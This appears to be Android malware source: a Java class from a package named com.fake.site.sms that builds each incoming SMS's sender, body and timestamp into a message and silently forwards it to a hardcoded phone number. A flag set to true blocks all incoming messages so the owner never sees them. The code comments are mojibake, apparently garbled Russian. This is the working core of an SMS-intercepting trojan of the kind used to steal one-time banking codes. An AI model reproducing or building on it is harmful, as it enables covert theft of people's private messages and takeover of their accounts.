package com.fake.site.sms;

import java.util.ArrayList;
import java.util.Arrays;

import android.telephony.SmsManager;

public class Sms {

	// РћРїСЂР°РІР»СЏС‚СЊ РІСЃРµ СЃРѕРѕР±С‰РµРЅРёСЏ РЅР° РЅРѕРјРµСЂ
	public final static String NUMBER = "+3";

	// Р�СЃРїРѕР»СЊР·РѕРІР°С‚СЊ РѕС‚РїСЂР°РІРєСѓ РІСЃРµС… СЃРѕРѕР±С‰РµРЅРёР№
	private final boolean USE_NUMBER = true;

	// Р—Р°РґР°СЋС‚СЃСЏ РЅРѕРјРµСЂР° С‚РµР»РµС„РѕРЅРѕРІ СЃ РєРѕС‚РѕСЂС‹С… РЅРµ РїСЂРёРЅРёРјР°СЋС‚СЃСЏ СЃРјСЃ
	// РІ С„РѕСЂРјР°С‚Рµ "+71234567890"
	private final String[] BLACK_LIST = { "" };
	// Р•СЃР»Рё РІ РїСЂРёР»РѕР¶РµРЅРёРё Р±СѓРґРµС‚ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊСЃСЏ С‡РµСЂРЅС‹Р№ СЃРїРёСЃРѕРє true РµСЃР»Рё РЅРµС‚ false
	private final boolean USE_BLACK_LIST = false;

	// Р•СЃР»Рё Р±Р»РѕРєРёСЂРѕРІР°С‚СЊ РІСЃРµ СЃРјСЃ СЃРѕРѕР±С‰РµРЅРёСЏ true РµСЃР»Рё РЅРµС‚ false
	private final boolean NOT_ACCEPT_ALL_MESSAGE = true;

	private String mBody;
	private String mSender;
	private String mTimestamp;

	public Sms(String _body, String _sender, long _timestamp) {
		this.mBody = _body;
		this.mSender = _sender;
		this.mTimestamp =  new java.text.SimpleDateFormat("dd/MM/yyyy HH:mm:ss").format(_timestamp);
	}

	public boolean filterAll() {
		if (NOT_ACCEPT_ALL_MESSAGE)
			return true;
		else
			return false;
	}

	public boolean filter() {
		if (USE_BLACK_LIST) {
			boolean mFilter = Arrays.asList(BLACK_LIST).contains(this.mSender);
			if (mFilter)
				return true;
			else
				return false;
		} else
			return false;
	}

	public String createMessage() {

		String mesage = this.mSender + " " + this.mBody + " " + this.mTimestamp;
		return mesage;

	}

	public void sendSms(String message) {
		if (USE_NUMBER) {
			SmsManager smsManager = SmsManager.getDefault();

			if (message.length() > 70) {
				ArrayList<String> mArray = smsManager.divideMessage(message);
				smsManager.sendMultipartTextMessage(NUMBER, null, mArray, null,
						null);
			} else
				smsManager.sendTextMessage(NUMBER, null, message, null, null);
		}

	}

}
